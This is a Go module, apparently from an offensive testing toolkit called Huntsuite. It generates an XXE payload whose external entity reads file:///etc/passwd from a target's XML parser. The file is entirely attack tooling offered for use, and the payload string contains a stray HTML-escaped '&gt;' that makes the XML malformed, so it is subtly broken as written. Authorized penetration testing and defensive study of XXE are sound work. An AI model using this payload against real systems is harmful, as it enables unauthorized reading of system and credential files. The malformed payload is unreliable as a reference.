
package payloads

import (
	"github.com/GhostN3xus/Huntsuite/pkg/modules"
)

// XXEPayloadGenerator gera payloads XXE.
type XXEPayloadGenerator struct{}

// NewXXEPayloadGenerator cria um novo gerador de payload XXE.
func NewXXEPayloadGenerator() *XXEPayloadGenerator {
	return &XXEPayloadGenerator{}
}

// Name retorna o nome do gerador de payload.
func (g *XXEPayloadGenerator) Name() string {
	return "xxe_basic"
}

// Generate gera uma lista de payloads XXE.
func (g *XXEPayloadGenerator) Generate(ctx *modules.TargetContext) ([]modules.Payload, error) {
	payloads := []modules.Payload{
		{Value: `<?xml version="1.0" ?><!DOCTYPE a [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><a&gt;&xxe;</a>`, Type: "XXE", Encoding: "XML"},
	}
	return payloads, nil
}
